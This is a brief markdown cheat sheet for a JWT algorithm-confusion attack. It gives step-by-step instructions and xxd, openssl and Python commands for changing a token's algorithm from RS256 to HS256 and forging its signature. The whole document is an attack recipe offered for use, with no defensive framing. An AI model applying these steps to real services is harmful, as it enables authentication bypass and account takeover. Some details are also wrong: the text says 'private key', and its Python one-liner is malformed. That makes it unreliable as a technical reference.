# JWT exploitation


1. Change the algorithm inside the JWT header
	Change the algorithm from `RS256` to `HS256`

2. Convert the private key to hex so openssl will use it

```bash
cat key | xxd -p | tr -d "\\n"
```

3. Use openssl to sign that as a valid HS256 key.

```bash
echo -n <TOKEN> | openssl dgst -sha256 -mac HMAC -macopt hexkey:<KEY>
```

4. Decode that hex to binary data, and reencode it in base64

```bash
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('<SECRET>')).replace('=','')\")""
```

5. Replace the secret inside the JWT token and viola!